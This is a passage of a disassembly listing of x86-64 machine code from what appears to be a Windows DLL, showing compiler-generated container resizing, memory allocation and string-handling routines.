   1800024f5:	74 2d                	je     0x180002524
   1800024f7:	49 8b 57 10          	mov    0x10(%r15),%rdx
   1800024fb:	48 2b d1             	sub    %rcx,%rdx
   1800024fe:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180002505:	72 18                	jb     0x18000251f
   180002507:	48 83 c2 27          	add    $0x27,%rdx
   18000250b:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   18000250f:	48 2b c8             	sub    %rax,%rcx
   180002512:	48 83 e9 08          	sub    $0x8,%rcx
   180002516:	48 83 f9 1f          	cmp    $0x1f,%rcx
   18000251a:	77 24                	ja     0x180002540
   18000251c:	48 8b c8             	mov    %rax,%rcx
   18000251f:	e8 00 24 00 00       	call   0x180004924
   180002524:	49 89 3f             	mov    %rdi,(%r15)
   180002527:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   18000252c:	48 03 c7             	add    %rdi,%rax
   18000252f:	49 89 47 08          	mov    %rax,0x8(%r15)
   180002533:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
   180002537:	49 89 47 10          	mov    %rax,0x10(%r15)
   18000253b:	e9 8a 00 00 00       	jmp    0x1800025ca
   180002540:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   180002547:	00 00 
   180002549:	45 33 c9             	xor    %r9d,%r9d
   18000254c:	45 33 c0             	xor    %r8d,%r8d
   18000254f:	33 d2                	xor    %edx,%edx
   180002551:	33 c9                	xor    %ecx,%ecx
   180002553:	ff 15 e7 3c 00 00    	call   *0x3ce7(%rip)        # 0x180006240
   180002559:	cc                   	int3
   18000255a:	48 8b f5             	mov    %rbp,%rsi
   18000255d:	48 2b f3             	sub    %rbx,%rsi
   180002560:	4c 3b f6             	cmp    %rsi,%r14
   180002563:	73 40                	jae    0x1800025a5
   180002565:	48 8b fd             	mov    %rbp,%rdi
   180002568:	49 2b fe             	sub    %r14,%rdi
   18000256b:	4d 8b c6             	mov    %r14,%r8
   18000256e:	48 8b d7             	mov    %rdi,%rdx
   180002571:	48 8b cd             	mov    %rbp,%rcx
   180002574:	e8 75 30 00 00       	call   0x1800055ee
   180002579:	49 8d 04 2e          	lea    (%r14,%rbp,1),%rax
   18000257d:	49 89 47 08          	mov    %rax,0x8(%r15)
   180002581:	48 2b fb             	sub    %rbx,%rdi
   180002584:	48 2b ef             	sub    %rdi,%rbp
   180002587:	4c 8b c7             	mov    %rdi,%r8
   18000258a:	48 8b d3             	mov    %rbx,%rdx
   18000258d:	48 8b cd             	mov    %rbp,%rcx
   180002590:	e8 59 30 00 00       	call   0x1800055ee
   180002595:	4d 8b c6             	mov    %r14,%r8
   180002598:	49 8b d4             	mov    %r12,%rdx
   18000259b:	48 8b cb             	mov    %rbx,%rcx
   18000259e:	e8 4b 30 00 00       	call   0x1800055ee
   1800025a3:	eb 25                	jmp    0x1800025ca
   1800025a5:	49 8d 3c 11          	lea    (%r9,%rdx,1),%rdi
   1800025a9:	4c 8b c6             	mov    %rsi,%r8
   1800025ac:	48 8b cf             	mov    %rdi,%rcx
   1800025af:	e8 3a 30 00 00       	call   0x1800055ee
   1800025b4:	48 8d 04 3e          	lea    (%rsi,%rdi,1),%rax
   1800025b8:	49 89 47 08          	mov    %rax,0x8(%r15)
   1800025bc:	4d 8b c6             	mov    %r14,%r8
   1800025bf:	49 8b d4             	mov    %r12,%rdx
   1800025c2:	48 8b cb             	mov    %rbx,%rcx
   1800025c5:	e8 24 30 00 00       	call   0x1800055ee
   1800025ca:	48 8b 9c 24 98 00 00 	mov    0x98(%rsp),%rbx
   1800025d1:	00 
   1800025d2:	48 83 c4 50          	add    $0x50,%rsp
   1800025d6:	41 5f                	pop    %r15
   1800025d8:	41 5e                	pop    %r14
   1800025da:	41 5d                	pop    %r13
   1800025dc:	41 5c                	pop    %r12
   1800025de:	5f                   	pop    %rdi
   1800025df:	5e                   	pop    %rsi
   1800025e0:	5d                   	pop    %rbp
   1800025e1:	c3                   	ret
   1800025e2:	e8 c9 0c 00 00       	call   0x1800032b0
   1800025e7:	cc                   	int3
   1800025e8:	e8 33 ed ff ff       	call   0x180001320
   1800025ed:	cc                   	int3
   1800025ee:	cc                   	int3
   1800025ef:	cc                   	int3
   1800025f0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800025f5:	55                   	push   %rbp
   1800025f6:	56                   	push   %rsi
   1800025f7:	57                   	push   %rdi
   1800025f8:	41 54                	push   %r12
   1800025fa:	41 55                	push   %r13
   1800025fc:	41 56                	push   %r14
   1800025fe:	41 57                	push   %r15
   180002600:	48 83 ec 50          	sub    $0x50,%rsp
   180002604:	4d 8b e1             	mov    %r9,%r12
   180002607:	4d 8b e8             	mov    %r8,%r13
   18000260a:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
   18000260f:	48 8b da             	mov    %rdx,%rbx
   180002612:	4c 8b f1             	mov    %rcx,%r14
   180002615:	48 8b 39             	mov    (%rcx),%rdi
   180002618:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   18000261d:	48 8b 69 08          	mov    0x8(%rcx),%rbp
   180002621:	4d 85 c9             	test   %r9,%r9
   180002624:	0f 84 29 02 00 00    	je     0x180002853
   18000262a:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   18000262e:	48 8b c1             	mov    %rcx,%rax
   180002631:	48 2b c5             	sub    %rbp,%rax
   180002634:	48 c1 f8 04          	sar    $0x4,%rax
   180002638:	4c 3b c8             	cmp    %rax,%r9
   18000263b:	0f 86 8d 01 00 00    	jbe    0x1800027ce
   180002641:	4c 8b ed             	mov    %rbp,%r13
   180002644:	4c 2b ef             	sub    %rdi,%r13
   180002647:	49 8b d5             	mov    %r13,%rdx
   18000264a:	48 c1 fa 04          	sar    $0x4,%rdx
   18000264e:	49 b8 ff ff ff ff ff 	movabs $0xfffffffffffffff,%r8
   180002655:	ff ff 0f 
   180002658:	49 8b c0             	mov    %r8,%rax
   18000265b:	48 2b c2             	sub    %rdx,%rax
   18000265e:	4c 3b c8             	cmp    %rax,%r9
   180002661:	0f 87 0a 02 00 00    	ja     0x180002871
   180002667:	4d 8d 3c 11          	lea    (%r9,%rdx,1),%r15
   18000266b:	48 2b cf             	sub    %rdi,%rcx
   18000266e:	48 c1 f9 04          	sar    $0x4,%rcx
   180002672:	48 8b d1             	mov    %rcx,%rdx
   180002675:	48 d1 ea             	shr    $1,%rdx
   180002678:	49 8b c0             	mov    %r8,%rax
   18000267b:	48 2b c2             	sub    %rdx,%rax
   18000267e:	48 3b c8             	cmp    %rax,%rcx
   180002681:	0f 87 e4 01 00 00    	ja     0x18000286b
   180002687:	48 8d 04 0a          	lea    (%rdx,%rcx,1),%rax
   18000268b:	49 8b f7             	mov    %r15,%rsi
   18000268e:	49 3b c7             	cmp    %r15,%rax
   180002691:	48 0f 43 f0          	cmovae %rax,%rsi
   180002695:	49 3b f0             	cmp    %r8,%rsi
   180002698:	0f 87 cd 01 00 00    	ja     0x18000286b
   18000269e:	48 c1 e6 04          	shl    $0x4,%rsi
   1800026a2:	48 85 f6             	test   %rsi,%rsi
   1800026a5:	75 04                	jne    0x1800026ab
   1800026a7:	33 ff                	xor    %edi,%edi
   1800026a9:	eb 3d                	jmp    0x1800026e8
   1800026ab:	48 81 fe 00 10 00 00 	cmp    $0x1000,%rsi
   1800026b2:	72 29                	jb     0x1800026dd
   1800026b4:	48 8d 4e 27          	lea    0x27(%rsi),%rcx
   1800026b8:	48 3b ce             	cmp    %rsi,%rcx
   1800026bb:	0f 86 aa 01 00 00    	jbe    0x18000286b
   1800026c1:	e8 ea 1d 00 00       	call   0x1800044b0
   1800026c6:	48 85 c0             	test   %rax,%rax
   1800026c9:	0f 84 e5 00 00 00    	je     0x1800027b4
   1800026cf:	48 8d 78 27          	lea    0x27(%rax),%rdi
   1800026d3:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   1800026d7:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   1800026db:	eb 0b                	jmp    0x1800026e8
   1800026dd:	48 8b ce             	mov    %rsi,%rcx
   1800026e0:	e8 cb 1d 00 00       	call   0x1800044b0
   1800026e5:	48 8b f8             	mov    %rax,%rdi
   1800026e8:	48 8b c3             	mov    %rbx,%rax
   1800026eb:	48 2b 44 24 30       	sub    0x30(%rsp),%rax
   1800026f0:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1800026f5:	48 c1 f8 04          	sar    $0x4,%rax
   1800026f9:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1800026fe:	4d 8b c4             	mov    %r12,%r8
   180002701:	49 c1 e0 04          	shl    $0x4,%r8
   180002705:	48 8b c8             	mov    %rax,%rcx
   180002708:	48 c1 e1 04          	shl    $0x4,%rcx
   18000270c:	48 03 cf             	add    %rdi,%rcx
   18000270f:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   180002714:	e8 d5 2e 00 00       	call   0x1800055ee
   180002719:	49 83 fc 01          	cmp    $0x1,%r12
   18000271d:	75 12                	jne    0x180002731
   18000271f:	48 3b dd             	cmp    %rbp,%rbx
   180002722:	75 0d                	jne    0x180002731
   180002724:	4d 8b c5             	mov    %r13,%r8
   180002727:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   18000272c:	48 8b cf             	mov    %rdi,%rcx
   18000272f:	eb 2a                	jmp    0x18000275b
   180002731:	4c 8b 44 24 40       	mov    0x40(%rsp),%r8
   180002736:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   18000273b:	48 8b cf             	mov    %rdi,%rcx
   18000273e:	e8 ab 2e 00 00       	call   0x1800055ee
   180002743:	48 2b eb             	sub    %rbx,%rbp
   180002746:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   18000274b:	49 03 cc             	add    %r12,%rcx
   18000274e:	48 c1 e1 04          	shl    $0x4,%rcx
   180002752:	48 03 cf             	add    %rdi,%rcx
   180002755:	4c 8b c5             	mov    %rbp,%r8
   180002758:	48 8b d3             	mov    %rbx,%rdx
   18000275b:	e8 8e 2e 00 00       	call   0x1800055ee
   180002760:	49 8b 0e             	mov    (%r14),%rcx
   180002763:	48 85 c9             	test   %rcx,%rcx
   180002766:	74 31                	je     0x180002799
   180002768:	49 8b 56 10          	mov    0x10(%r14),%rdx
   18000276c:	48 2b d1             	sub    %rcx,%rdx
   18000276f:	48 83 e2 f0          	and    $0xfffffffffffffff0,%rdx
   180002773:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   18000277a:	72 18                	jb     0x180002794
   18000277c:	48 83 c2 27          	add    $0x27,%rdx
   180002780:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   180002784:	48 2b c8             	sub    %rax,%rcx
   180002787:	48 83 e9 08          	sub    $0x8,%rcx
   18000278b:	48 83 f9 1f          	cmp    $0x1f,%rcx
   18000278f:	77 23                	ja     0x1800027b4
   180002791:	48 8b c8             	mov    %rax,%rcx
   180002794:	e8 8b 21 00 00       	call   0x180004924
   180002799:	49 89 3e             	mov    %rdi,(%r14)
   18000279c:	49 c1 e7 04          	shl    $0x4,%r15
   1800027a0:	4c 03 ff             	add    %rdi,%r15
   1800027a3:	4d 89 7e 08          	mov    %r15,0x8(%r14)
   1800027a7:	48 8d 04 3e          	lea    (%rsi,%rdi,1),%rax
   1800027ab:	49 89 46 10          	mov    %rax,0x10(%r14)
   1800027af:	e9 9f 00 00 00       	jmp    0x180002853
   1800027b4:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1800027bb:	00 00 
   1800027bd:	45 33 c9             	xor    %r9d,%r9d
   1800027c0:	45 33 c0             	xor    %r8d,%r8d
   1800027c3:	33 d2                	xor    %edx,%edx
   1800027c5:	33 c9                	xor    %ecx,%ecx
   1800027c7:	ff 15 73 3a 00 00    	call   *0x3a73(%rip)        # 0x180006240
   1800027cd:	cc                   	int3
   1800027ce:	4c 8b c5             	mov    %rbp,%r8
   1800027d1:	4c 2b c3             	sub    %rbx,%r8
   1800027d4:	49 8b f0             	mov    %r8,%rsi
   1800027d7:	48 c1 fe 04          	sar    $0x4,%rsi
   1800027db:	4d 8b fc             	mov    %r12,%r15
   1800027de:	49 c1 e7 04          	shl    $0x4,%r15
   1800027e2:	4c 3b e6             	cmp    %rsi,%r12
   1800027e5:	73 47                	jae    0x18000282e
   1800027e7:	48 8b d5             	mov    %rbp,%rdx
   1800027ea:	49 2b d7             	sub    %r15,%rdx
   1800027ed:	4d 8b c7             	mov    %r15,%r8
   1800027f0:	48 8b cd             	mov    %rbp,%rcx
   1800027f3:	e8 f6 2d 00 00       	call   0x1800055ee
   1800027f8:	49 8b c7             	mov    %r15,%rax
   1800027fb:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   1800027ff:	48 03 c5             	add    %rbp,%rax
   180002802:	49 89 46 08          	mov    %rax,0x8(%r14)
   180002806:	4d 6b c4 f0          	imul   $0xfffffffffffffff0,%r12,%r8
   18000280a:	4c 2b c3             	sub    %rbx,%r8
   18000280d:	4c 03 c5             	add    %rbp,%r8
   180002810:	49 2b e8             	sub    %r8,%rbp
   180002813:	48 8b d3             	mov    %rbx,%rdx
   180002816:	48 8b cd             	mov    %rbp,%rcx
   180002819:	e8 d0 2d 00 00       	call   0x1800055ee
   18000281e:	4d 8b c7             	mov    %r15,%r8
   180002821:	49 8b d5             	mov    %r13,%rdx
   180002824:	48 8b cb             	mov    %rbx,%rcx
   180002827:	e8 c2 2d 00 00       	call   0x1800055ee
   18000282c:	eb 25                	jmp    0x180002853
   18000282e:	49 8d 3c 17          	lea    (%r15,%rdx,1),%rdi
   180002832:	48 8b cf             	mov    %rdi,%rcx
   180002835:	e8 b4 2d 00 00       	call   0x1800055ee
   18000283a:	48 c1 e6 04          	shl    $0x4,%rsi
   18000283e:	48 03 f7             	add    %rdi,%rsi
   180002841:	49 89 76 08          	mov    %rsi,0x8(%r14)
   180002845:	4d 8b c7             	mov    %r15,%r8
   180002848:	49 8b d5             	mov    %r13,%rdx
   18000284b:	48 8b cb             	mov    %rbx,%rcx
   18000284e:	e8 9b 2d 00 00       	call   0x1800055ee
   180002853:	48 8b 9c 24 98 00 00 	mov    0x98(%rsp),%rbx
   18000285a:	00 
   18000285b:	48 83 c4 50          	add    $0x50,%rsp
   18000285f:	41 5f                	pop    %r15
   180002861:	41 5e                	pop    %r14
   180002863:	41 5d                	pop    %r13
   180002865:	41 5c                	pop    %r12
   180002867:	5f                   	pop    %rdi
   180002868:	5e                   	pop    %rsi
   180002869:	5d                   	pop    %rbp
   18000286a:	c3                   	ret
   18000286b:	e8 b0 ea ff ff       	call   0x180001320
   180002870:	cc                   	int3
   180002871:	e8 3a 0a 00 00       	call   0x1800032b0
   180002876:	cc                   	int3
   180002877:	cc                   	int3
   180002878:	cc                   	int3
   180002879:	cc                   	int3
   18000287a:	cc                   	int3
   18000287b:	cc                   	int3
   18000287c:	cc                   	int3
   18000287d:	cc                   	int3
   18000287e:	cc                   	int3
   18000287f:	cc                   	int3
   180002880:	40 53                	rex push %rbx
   180002882:	56                   	push   %rsi
   180002883:	41 56                	push   %r14
   180002885:	41 57                	push   %r15
   180002887:	48 83 ec 38          	sub    $0x38,%rsp
   18000288b:	49 be fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%r14
   180002892:	ff ff 7f 
   180002895:	49 8b d8             	mov    %r8,%rbx
   180002898:	4c 8b fa             	mov    %rdx,%r15
   18000289b:	48 8b f1             	mov    %rcx,%rsi
   18000289e:	4d 3b c6             	cmp    %r14,%r8
   1800028a1:	0f 87 09 01 00 00    	ja     0x1800029b0
   1800028a7:	48 89 6c 24 78       	mov    %rbp,0x78(%rsp)
   1800028ac:	48 83 fb 07          	cmp    $0x7,%rbx
   1800028b0:	77 2d                	ja     0x1800028df
   1800028b2:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   1800028b6:	48 03 db             	add    %rbx,%rbx
   1800028b9:	4c 8b c3             	mov    %rbx,%r8
   1800028bc:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   1800028c3:	00 
   1800028c4:	e8 b3 2b 00 00       	call   0x18000547c
   1800028c9:	33 ed                	xor    %ebp,%ebp
   1800028cb:	66 89 2c 33          	mov    %bp,(%rbx,%rsi,1)
   1800028cf:	48 8b 6c 24 78       	mov    0x78(%rsp),%rbp
   1800028d4:	48 83 c4 38          	add    $0x38,%rsp
   1800028d8:	41 5f                	pop    %r15
   1800028da:	41 5e                	pop    %r14
   1800028dc:	5e                   	pop    %rsi
   1800028dd:	5b                   	pop    %rbx
   1800028de:	c3                   	ret
   1800028df:	48 8b c3             	mov    %rbx,%rax
   1800028e2:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   1800028e7:	48 83 c8 07          	or     $0x7,%rax
   1800028eb:	33 ed                	xor    %ebp,%ebp
   1800028ed:	49 3b c6             	cmp    %r14,%rax
   1800028f0:	76 47                	jbe    0x180002939
   1800028f2:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1800028f9:	ff ff 7f 
   1800028fc:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   180002900:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   180002907:	72 6a                	jb     0x180002973
   180002909:	48 8d 41 27          	lea    0x27(%rcx),%rax
   18000290d:	48 3b c1             	cmp    %rcx,%rax
   180002910:	0f 86 a0 00 00 00    	jbe    0x1800029b6
   180002916:	48 8b c8             	mov    %rax,%rcx
   180002919:	e8 92 1b 00 00       	call   0x1800044b0
   18000291e:	48 85 c0             	test   %rax,%rax
   180002921:	75 42                	jne    0x180002965
   180002923:	45 33 c9             	xor    %r9d,%r9d
   180002926:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   18000292b:	45 33 c0             	xor    %r8d,%r8d
   18000292e:	33 d2                	xor    %edx,%edx
   180002930:	33 c9                	xor    %ecx,%ecx
   180002932:	ff 15 08 39 00 00    	call   *0x3908(%rip)        # 0x180006240
   180002938:	cc                   	int3
   180002939:	b9 0a 00 00 00       	mov    $0xa,%ecx
   18000293e:	4c 8b f0             	mov    %rax,%r14
   180002941:	48 3b c1             	cmp    %rcx,%rax
   180002944:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   18000294b:	ff ff 7f 
   18000294e:	4c 0f 42 f1          	cmovb  %rcx,%r14
   180002952:	49 8d 4e 01          	lea    0x1(%r14),%rcx
   180002956:	48 3b c8             	cmp    %rax,%rcx
   180002959:	77 5b                	ja     0x1800029b6
   18000295b:	48 03 c9             	add    %rcx,%rcx
   18000295e:	75 a0                	jne    0x180002900
   180002960:	48 8b fd             	mov    %rbp,%rdi
   180002963:	eb 16                	jmp    0x18000297b
   180002965:	48 8d 78 27          	lea    0x27(%rax),%rdi
   180002969:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   18000296d:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   180002971:	eb 08                	jmp    0x18000297b
   180002973:	e8 38 1b 00 00       	call   0x1800044b0
   180002978:	48 8b f8             	mov    %rax,%rdi
   18000297b:	48 89 5e 10          	mov    %rbx,0x10(%rsi)
   18000297f:	49 8b d7             	mov    %r15,%rdx
   180002982:	48 03 db             	add    %rbx,%rbx
   180002985:	48 89 3e             	mov    %rdi,(%rsi)
   180002988:	4c 8b c3             	mov    %rbx,%r8
   18000298b:	4c 89 76 18          	mov    %r14,0x18(%rsi)
   18000298f:	48 8b cf             	mov    %rdi,%rcx
   180002992:	e8 e5 2a 00 00       	call   0x18000547c
   180002997:	66 89 2c 3b          	mov    %bp,(%rbx,%rdi,1)
   18000299b:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1800029a0:	48 8b 6c 24 78       	mov    0x78(%rsp),%rbp
   1800029a5:	48 83 c4 38          	add    $0x38,%rsp
   1800029a9:	41 5f                	pop    %r15
   1800029ab:	41 5e                	pop    %r14
   1800029ad:	5e                   	pop    %rsi
   1800029ae:	5b                   	pop    %rbx
   1800029af:	c3                   	ret
   1800029b0:	e8 0b ea ff ff       	call   0x1800013c0
   1800029b5:	cc                   	int3
   1800029b6:	e8 65 e9 ff ff       	call   0x180001320
   1800029bb:	cc                   	int3
   1800029bc:	cc                   	int3
   1800029bd:	cc                   	int3
   1800029be:	cc                   	int3
   1800029bf:	cc                   	int3
   1800029c0:	40 53                	rex push %rbx
   1800029c2:	48 83 ec 30          	sub    $0x30,%rsp
   1800029c6:	48 8b d9             	mov    %rcx,%rbx
   1800029c9:	48 8b 09             	mov    (%rcx),%rcx
   1800029cc:	48 85 c9             	test   %rcx,%rcx
   1800029cf:	74 4a                	je     0x180002a1b
   1800029d1:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   1800029d5:	e8 96 07 00 00       	call   0x180003170
   1800029da:	48 8b 0b             	mov    (%rbx),%rcx
   1800029dd:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   1800029e1:	48 2b d1             	sub    %rcx,%rdx
   1800029e4:	48 83 e2 e0          	and    $0xffffffffffffffe0,%rdx
   1800029e8:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800029ef:	72 18                	jb     0x180002a09
   1800029f1:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   1800029f5:	48 83 c2 27          	add    $0x27,%rdx
   1800029f9:	48 2b c8             	sub    %rax,%rcx
   1800029fc:	48 83 e9 08          	sub    $0x8,%rcx
   180002a00:	48 83 f9 1f          	cmp    $0x1f,%rcx
   180002a04:	77 1b                	ja     0x180002a21
   180002a06:	48 8b c8             	mov    %rax,%rcx
   180002a09:	e8 16 1f 00 00       	call   0x180004924
   180002a0e:	33 c0                	xor    %eax,%eax
   180002a10:	48 89 03             	mov    %rax,(%rbx)
   180002a13:	48 89 43 08          	mov    %rax,0x8(%rbx)
   180002a17:	48 89 43 10          	mov    %rax,0x10(%rbx)
   180002a1b:	48 83 c4 30          	add    $0x30,%rsp
   180002a1f:	5b                   	pop    %rbx
   180002a20:	c3                   	ret
   180002a21:	33 c0                	xor    %eax,%eax
   180002a23:	45 33 c9             	xor    %r9d,%r9d
   180002a26:	45 33 c0             	xor    %r8d,%r8d
   180002a29:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002a2e:	33 d2                	xor    %edx,%edx
   180002a30:	33 c9                	xor    %ecx,%ecx
   180002a32:	ff 15 08 38 00 00    	call   *0x3808(%rip)        # 0x180006240
   180002a38:	cc                   	int3
   180002a39:	cc                   	int3
   180002a3a:	cc                   	int3
   180002a3b:	cc                   	int3
   180002a3c:	cc                   	int3
   180002a3d:	cc                   	int3
   180002a3e:	cc                   	int3
   180002a3f:	cc                   	int3
   180002a40:	40 53                	rex push %rbx
   180002a42:	48 83 ec 30          	sub    $0x30,%rsp
   180002a46:	48 8b d9             	mov    %rcx,%rbx
   180002a49:	48 8b 09             	mov    (%rcx),%rcx
   180002a4c:	48 85 c9             	test   %rcx,%rcx
   180002a4f:	74 4a                	je     0x180002a9b
   180002a51:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   180002a55:	e8 b6 07 00 00       	call   0x180003210
   180002a5a:	48 8b 0b             	mov    (%rbx),%rcx
   180002a5d:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   180002a61:	48 2b d1             	sub    %rcx,%rdx
   180002a64:	48 83 e2 e0          	and    $0xffffffffffffffe0,%rdx
   180002a68:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   180002a6f:	72 18                	jb     0x180002a89
   180002a71:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   180002a75:	48 83 c2 27          	add    $0x27,%rdx
   180002a79:	48 2b c8             	sub    %rax,%rcx
   180002a7c:	48 83 e9 08          	sub    $0x8,%rcx
   180002a80:	48 83 f9 1f          	cmp    $0x1f,%rcx
   180002a84:	77 1b                	ja     0x180002aa1
   180002a86:	48 8b c8             	mov    %rax,%rcx
   180002a89:	e8 96 1e 00 00       	call   0x180004924
   180002a8e:	33 c0                	xor    %eax,%eax
   180002a90:	48 89 03             	mov    %rax,(%rbx)
   180002a93:	48 89 43 08          	mov    %rax,0x8(%rbx)
   180002a97:	48 89 43 10          	mov    %rax,0x10(%rbx)
   180002a9b:	48 83 c4 30          	add    $0x30,%rsp
   180002a9f:	5b                   	pop    %rbx
   180002aa0:	c3                   	ret
   180002aa1:	33 c0                	xor    %eax,%eax
   180002aa3:	45 33 c9             	xor    %r9d,%r9d
   180002aa6:	45 33 c0             	xor    %r8d,%r8d
   180002aa9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002aae:	33 d2                	xor    %edx,%edx
   180002ab0:	33 c9                	xor    %ecx,%ecx
   180002ab2:	ff 15 88 37 00 00    	call   *0x3788(%rip)        # 0x180006240
   180002ab8:	cc                   	int3
   180002ab9:	cc                   	int3
   180002aba:	cc                   	int3
   180002abb:	cc                   	int3
   180002abc:	cc                   	int3
   180002abd:	cc                   	int3
   180002abe:	cc                   	int3
   180002abf:	cc                   	int3
   180002ac0:	40 55                	rex push %rbp
   180002ac2:	56                   	push   %rsi
   180002ac3:	41 54                	push   %r12
   180002ac5:	41 56                	push   %r14
   180002ac7:	41 57                	push   %r15
   180002ac9:	48 83 ec 30          	sub    $0x30,%rsp
   180002acd:	48 8b 01             	mov    (%rcx),%rax
   180002ad0:	4c 8b f2             	mov    %rdx,%r14
   180002ad3:	48 8b 69 08          	mov    0x8(%rcx),%rbp
   180002ad7:	4d 8b e0             	mov    %r8,%r12
   180002ada:	48 2b e8             	sub    %rax,%rbp
   180002add:	4c 2b f0             	sub    %rax,%r14
   180002ae0:	48 c1 fd 04          	sar    $0x4,%rbp
   180002ae4:	49 b8 ff ff ff ff ff 	movabs $0xfffffffffffffff,%r8
   180002aeb:	ff ff 0f 
   180002aee:	4c 8b fa             	mov    %rdx,%r15
   180002af1:	48 8b f1             	mov    %rcx,%rsi
   180002af4:	49 3b e8             	cmp    %r8,%rbp
   180002af7:	0f 84 53 01 00 00    	je     0x180002c50
   180002afd:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   180002b01:	48 ff c5             	inc    %rbp
   180002b04:	48 2b c8             	sub    %rax,%rcx
   180002b07:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   180002b0c:	48 c1 f9 04          	sar    $0x4,%rcx
   180002b10:	49 8b c0             	mov    %r8,%rax
   180002b13:	48 8b d1             	mov    %rcx,%rdx
   180002b16:	48 89 7c 24 78       	mov    %rdi,0x78(%rsp)
   180002b1b:	48 d1 ea             	shr    $1,%rdx
   180002b1e:	48 2b c2             	sub    %rdx,%rax
   180002b21:	48 3b c8             	cmp    %rax,%rcx
   180002b24:	0f 87 2c 01 00 00    	ja     0x180002c56
   180002b2a:	48 8d 04 0a          	lea    (%rdx,%rcx,1),%rax
   180002b2e:	48 8b fd             	mov    %rbp,%rdi
   180002b31:	48 3b c5             	cmp    %rbp,%rax
   180002b34:	48 0f 43 f8          	cmovae %rax,%rdi
   180002b38:	49 3b f8             	cmp    %r8,%rdi
   180002b3b:	0f 87 15 01 00 00    	ja     0x180002c56
   180002b41:	48 c1 e7 04          	shl    $0x4,%rdi
   180002b45:	48 85 ff             	test   %rdi,%rdi
   180002b48:	75 04                	jne    0x180002b4e
   180002b4a:	33 db                	xor    %ebx,%ebx
   180002b4c:	eb 3d                	jmp    0x180002b8b
   180002b4e:	48 81 ff 00 10 00 00 	cmp    $0x1000,%rdi
   180002b55:	72 29                	jb     0x180002b80
   180002b57:	48 8d 4f 27          	lea    0x27(%rdi),%rcx
   180002b5b:	48 3b cf             	cmp    %rdi,%rcx
   180002b5e:	0f 86 f2 00 00 00    	jbe    0x180002c56
   180002b64:	e8 47 19 00 00       	call   0x1800044b0
   180002b69:	48 85 c0             	test   %rax,%rax
   180002b6c:	0f 84 c4 00 00 00    	je     0x180002c36
   180002b72:	48 8d 58 27          	lea    0x27(%rax),%rbx
   180002b76:	48 83 e3 e0          	and    $0xffffffffffffffe0,%rbx
   180002b7a:	48 89 43 f8          	mov    %rax,-0x8(%rbx)
   180002b7e:	eb 0b                	jmp    0x180002b8b
   180002b80:	48 8b cf             	mov    %rdi,%rcx
   180002b83:	e8 28 19 00 00       	call   0x1800044b0
   180002b88:	48 8b d8             	mov    %rax,%rbx
   180002b8b:	41 0f 10 04 24       	movups (%r12),%xmm0
   180002b90:	49 83 e6 f0          	and    $0xfffffffffffffff0,%r14
   180002b94:	48 8b cb             	mov    %rbx,%rcx
   180002b97:	4c 03 f3             	add    %rbx,%r14
   180002b9a:	41 0f 11 06          	movups %xmm0,(%r14)
   180002b9e:	4c 8b 46 08          	mov    0x8(%rsi),%r8
   180002ba2:	48 8b 16             	mov    (%rsi),%rdx
   180002ba5:	4d 3b f8             	cmp    %r8,%r15
   180002ba8:	75 05                	jne    0x180002baf
   180002baa:	4c 2b c2             	sub    %rdx,%r8
   180002bad:	eb 19                	jmp    0x180002bc8
   180002baf:	4d 8b c7             	mov    %r15,%r8
   180002bb2:	4c 2b c2             	sub    %rdx,%r8
   180002bb5:	e8 34 2a 00 00       	call   0x1800055ee
   180002bba:	4c 8b 46 08          	mov    0x8(%rsi),%r8
   180002bbe:	49 8d 4e 10          	lea    0x10(%r14),%rcx
   180002bc2:	4d 2b c7             	sub    %r15,%r8
   180002bc5:	49 8b d7             	mov    %r15,%rdx
   180002bc8:	e8 21 2a 00 00       	call   0x1800055ee
   180002bcd:	48 8b 0e             	mov    (%rsi),%rcx
   180002bd0:	48 85 c9             	test   %rcx,%rcx
   180002bd3:	74 31                	je     0x180002c06
   180002bd5:	48 8b 56 10          	mov    0x10(%rsi),%rdx
   180002bd9:	48 2b d1             	sub    %rcx,%rdx
